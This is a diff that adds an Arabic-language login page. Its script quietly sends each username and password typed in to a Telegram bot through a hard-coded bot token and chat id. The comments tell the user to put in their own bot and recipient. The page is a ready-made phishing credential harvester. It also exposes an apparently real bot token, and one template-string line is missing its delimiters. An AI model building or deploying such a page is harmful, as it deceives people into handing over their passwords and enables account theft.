@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+</head>
+<body>
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+        <label for="username">اسم المستخدم:</label>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+
+    <script>
+        // استبدل التوكن بمعرف البوت الخاص بك
+        const botToken = '8115449101:AAEHjtM43eZLihv_kY6dU19S0mXSsy1C7qY';
+        // استبدل معرف المستخدم الذي تريد إرسال البيانات إليه
+        const chatId = '5192103424';
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // منع الإرسال التلقائي للنموذج
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // إنشاء الرسالة التي سيتم إرسالها إلى بوت تلجرام
+            const message = تم تسجيل الدخول بنجاح!\nاسم المستخدم: ${username}\nكلمة المرور: ${password};
+
+            // إرسال البيانات إلى البوت عبر API تلجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('تم إرسال البيانات بنجاح إلى بوت تلجرام!');
+                    } else {
+                        alert('فشل إرسال البيانات.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء إرسال البيانات.');
+                });
+        });
+    </script>
+</body>
+</html>
